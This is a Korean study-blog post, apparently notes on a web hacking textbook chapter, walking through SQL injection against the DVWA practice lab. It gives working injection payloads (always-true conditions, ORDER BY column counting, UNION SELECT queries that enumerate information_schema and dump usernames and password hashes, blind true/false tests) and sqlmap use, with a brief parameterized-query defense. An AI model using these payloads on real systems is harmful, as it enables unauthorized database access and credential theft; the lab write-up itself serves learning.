---
layout: post
category : Practice

---

--------------------------------------------------

<center style="color:red;">
!warning!<br>

본 게시글은 본인의 학습기록을 위해 작성된 알려진 학습 기법<br>

함부로 악의적으로 이용은 엄연히 불법 임으로<br>

절대 시도하지 말 것이며<br>

사고 발생 시 본인은 절대로 책임지지 않습니다!<br>
</center>

--------------------------------------------------

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/Chapter7.png" width="400" height="300"> <br>
</div><br>

<center><font size="5em" color="#0091ff">Chapter07. SQL 인젝션 공격</font> </center>
<font size="3em" color="#0091ff">
<center>SQL 인젝션공격 개요</center>
<br>
- 웹 서버 영역의 DB로 전송되는 SQL 쿼리문을 사용자가 임의로 조작할 수 있는 경우 발생
<br><br>


<font size="4em" color="#0091ff">1. WHERE 구문을 우회하여 공격</font><br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">$id&nbsp;<span style="color:#010101"></span><span style="color:#0099cc">=</span>&nbsp;$_REQUEST[&nbsp;‘id’&nbsp;];&nbsp;&nbsp;&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">$query&nbsp;<span style="color:#010101"></span><span style="color:#0099cc">=</span>&nbsp;“SELECT&nbsp;name,&nbsp;email&nbsp;<span style="color:#ff3399">FROM</span>&nbsp;users&nbsp;<span style="color:#ff3399">WHERE</span>&nbsp;id&nbsp;<span style="color:#010101"></span><span style="color:#0099cc">=</span>&nbsp;‘&nbsp;$id&nbsp;’;”;</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>  

-위 예제의 경우 사용자가 입력한 id 파라미터 값($id)이 쿼리문의 일부로 사용되고 있음,


이때 사용자가 id값으로 1’ or ‘1’=’1을 입력하게 되면 <br>id='1'항상 참이 되어 모든 사용자의 이름과 이메일이 공격자에게 전달됨

<font size="4em" color="#0091ff">2. UNION 구문을 이용한 공격</font><br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#ff3399">SELECT</span>&nbsp;name,&nbsp;email&nbsp;<span style="color:#ff3399">FROM</span>&nbsp;users&nbsp;<span style="color:#ff3399">WHERE</span>&nbsp;ID<span style="color:#010101"></span><span style="color:#0099cc">=</span>’1’&nbsp;UNION&nbsp;<span style="color:#ff3399">SELECT</span>&nbsp;name,&nbsp;pw&nbsp;<span style="color:#ff3399">FROM</span>&nbsp;users#~~~’</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>
 
-UNION은 합집합으로 두 SELECT 구문의 결과를 모두 포함<br>
시키게 함, 쿼리 끝에 #을 삽입하는 이유는 맨<br>
끝 ‘을 주석 처리하려고 씀. ’짝수가 안맞아서<br> 

주석처리가 안되어 있으면 에러가 발생할 수 있음+<br>
뒤에 있을지 모르는 구문(~~~)주석 처리<br><br>

<center><font size="4em" color="#0091ff">WHERE 구문우회 실습</font></center><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter7/001.png" width="600" height="500"> <br>
</div>스샷. 1<br>
- SQL 인젝션 공격에 취약한지 테스트해볼 수 있는 가장<br> 기본적인 방법은 ‘을 입력해보는 것임
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/002.png" width="600" height="500"> <br>
</div>스샷. 2<br>
- 이렇게 ‘ 입력해서 건들러 보면 SQL 구문 에러가 발생되지요, 그리고<br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#ff3399">SELECT</span>&nbsp;name,&nbsp;email&nbsp;<span style="color:#ff3399">FROM</span>&nbsp;users&nbsp;<span style="color:#ff3399">WHERE</span>&nbsp;id&nbsp;<span style="color:#010101"></span><span style="color:#0099cc">=</span>&nbsp;‘’’;</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>


입력하면

-쌍이 맞이 않아 Syntax 에러 발생<br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">1’&nbsp;or&nbsp;’1’=’1</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>


<div align="center" >
<img src="/Art of Web Hacking/Chapter7/003.png" width="600" height="500"> <br>
</div>스샷. 3<br>
- User ID에 표에 있는 구문 입력하면 admin 외에도 다른<br>
사용자의 정보가 출력됨<br><br>

<center><font size="4em" color="#0091ff">ORDER BY 및UNION 공격 실습
</font></center><br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">1’&nbsp;<span style="color:#ff3399">ORDER</span>&nbsp;<span style="color:#ff3399">BY</span>&nbsp;<span style="color:#004fc8">1</span>#</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

-ORDER BY 뒤의 숫자를 증가시켜 가다가 에러 발생하면 <br>
그 전 값이 칼럼의 개수

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/004.png" width="600" height="500"> <br>
</div>스샷. 4<span style="color: #FFFFFF">~~死~~</span><br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">‘&nbsp;UNION&nbsp;<span style="color:#ff3399">SELECT</span>&nbsp;schema_name,<span style="color:#004fc8">2</span>&nbsp;<span style="color:#ff3399">from</span>&nbsp;information_schema.schemata#&nbsp;</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

-MYSQL DB는 information_shema라는 DB에서 데이터베이스 이름,<br>

테이블, 칼럼 정보 등을 관리, 따라서 information_schema의 <br>

schemata 테이블로부터 shema_name을 가져오는 SQL 쿼리문을 이용하면 DB이름을 알아낼 수 있음<br>

-‘앞에 상수를 써도 되지만 안 써도 무방합니다.
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/005.png" width="600" height="300"> <br>
</div>스샷. 5<br>
- first name 뒤에 데이터 베이스의 이름이 출력되고 있고, DVWA에서<br>
사용하는 DB의 이름이 dvwa임을 추측 할 수 있습니다.<br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#7DA123">'&nbsp;UNION&nbsp;SELECT&nbsp;table_name,2&nbsp;from&nbsp;information_schema.tables&nbsp;where&nbsp;table_schema='</span>dvwa<span style="color:#7DA123">'#</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/006.png" width="600" height="200"> <br>
</div>스샷. 6<br>
- table_schema가 dvwa인지를 확인하는 조건을 <br>
주어 dvwa DB의 테이블만 출력,guest와 users라는 테이블이 출력됨<br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#7DA123">'&nbsp;UNION&nbsp;SELECT&nbsp;column_name,2&nbsp;from&nbsp;information_schema.columns&nbsp;where&nbsp;table_schema='</span>dvwa<span style="color:#7DA123">'&nbsp;and&nbsp;table_name='</span>users<span style="color:#7DA123">'#</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/007.png" width="600" height="500"> <br>
</div>스샷. 7<br>
- 사용자(users) 테이블의 칼럼 목록을 알아내는 구문과 입력 결과, user와 password 칼럼이 눈에 띄는군요<br><br>


<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#7DA123">'&nbsp;UNION&nbsp;SELECT&nbsp;user,password&nbsp;from&nbsp;users#</span></div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>

<br><div align="center" >
<img src="/Art of Web Hacking/Chapter7/008.png" width="500" height="300"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/009.png" width="500" height="100"> <br>
</div>스샷. 7-8<br>

-사용자 이름과 패스워드 해시가 출력됨, <br>
admin의 surname md5 복호화 하면 password 됩니다.

<center><font size="4em" color="#0091ff">블라인드 SQL 인젝션공격
</font></center><br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/010.png" width="300" height="100"> <br>
</div>스샷. 9<br>
-‘을 입력하니 해당 사용자 ID가 DB에 없다는 메시지가 출력됩니다. <br>
에러가 발생하지 않도록<br><br>

처리하는 루틴이 구현되어 있음을 추측, <br>
별다른 에러가 발생하지 않아 얘가 SQL 쿼리문을<br>
사용하고 있는지 모름<br>
<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">1’&nbsp;AND&nbsp;<span style="color:#004fc8">1</span><span style="color:#0099cc">=</span><span style="color:#004fc8">1</span>#</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>


<br><div align="center" >
<img src="/Art of Web Hacking/Chapter7/011.png" width="300" height="100"> <br>
</div>스샷. 10<br>
- SQL 구문이 실행된다면 AND 조건이 같이 처리되어 <br>
참이 될 수 있는 구문을 입력했는데 ID가 존재 한다는  <br>
메시지가 출력됩니다. <br>
<br>

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%">1’&nbsp;AND&nbsp;<span style="color:#004fc8">1</span><span style="color:#0099cc">=</span><span style="color:#004fc8">2</span>#</div></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>


<br><div align="center" >
<img src="/Art of Web Hacking/Chapter7/012.png" width="300" height="100"> <br>
</div>스샷. 11<br>

-SQL 구문이 사용되는지 확실히 하기 위하여 FALSE가 되는<br>
구문을 입력했더니 사용자가 없다고 뜸, SQL 쿼리문을<br> 
통해 처리되고 있음을 확인<br><br>

-AND 등과 같은 연산이 실행되어 참과 거짓에 따라<br>
그 결과가 다르게 구분되어<br><br>


출력되는 것은 SQL 쿼리문이 뒤에서 사용된다는 증거<br>

(같은 결과가 출력되는 경우에는 AND 뒤에 SLEEP함수를<br>넣어보면 됨,
참일 경우에만 실행됨)


<center><font size="4em" color="#0091ff">sqlmap 자동화공격</font></center>

<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/013.png" width="600" height="500"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/014.png" width="600" height="500"> <br>
</div>스샷. 12-13<br>
-1을 입력하고 [Submit] 누르면 주소 창에 요청을 전송한 URL이 표시됨

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/015.png" width="600" height="500"> <br>
</div>스샷. 14<br>
- 쿠키 값 확인은 F12 누르고 document.cookie 입력

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/016.png" width="600" height="500"> <br>
</div>스샷. 15<br>
- 옵션 값 중에 &나 #은 특수 기능으로 사용되기 때문에 따옴표로 묶어줘야 합니다.

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/017.png" width="600" height="500"> <br>
</div>스샷. 16<br>
- 기본적인 점검에서 id 변수가 취약하며,OS정보와 Web Application정보,<br> DBMS정보등을 알아오는 것 을 알 수 있습니다.

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/018.png" width="600" height="500"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/019.png" width="600" height="500"> <br>
</div>스샷. 17-18<br>
- DB 뭐 쓰는지 알아냄니다.
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/020.png" width="600" height="500"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/021.png" width="600" height="500"> <br>
</div>스샷. 19-20<br>
-테이블 뭐 있는지 조사 해봅니다.

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/022.png" width="600" height="500"> <br>
</div><br>
<div align="center" >
<img src="/Art of Web Hacking/Chapter7/023.png" width="600" height="500"> <br>
</div>스샷. 21-22<br>
- 사용자 ID와 Password 해시, 크래킹된 Password들이 출력됨,<br>
이과정을 반복하면 DB의 정보들을 다 조사<span style="color: #FFFFFF">~~이정재?~~</span> 할 수 있음
<br><br>

<center><font size="4em" color="#0091ff">SQL 인젝션공격 대응</font></center><br>


-사용자가 입력한 값은 SQL 쿼리문 에서 오직 데이터로만<br> 사용되어야함 ->쿼리문을 구성하고 실행하는 방법을 파라미터<br> 쿼리 로 변경
<br>




=================================================

<center><font size="4em" color="#0091ff">


오늘 챕터 7 작성 완료…<br>

연속적으로 강제 휴일 중입니다…ōxō<br>

미친놈들… 휴 그양 <br>

다른 자리 알아보던지 <br>


해야겠습니다. 이거야 원… |ω･`)<br>

하다못해 팬시 일러스트 라도(…)<br>
~~퍽! 펵!펵…!~~<br>


 
아무튼 긴 글을 읽어 주셔서 감사하고<br>

좋은 하루 보내시고, 하시는 일 잘 되시고<br>

역시 우환 폐렴 조심 하시길 바랍니다. :)<br>

<div align="center" >
<img src="/Art of Web Hacking/Chapter7/024.png" width="320" height="320"> <br>
</div>





</font></center><br>
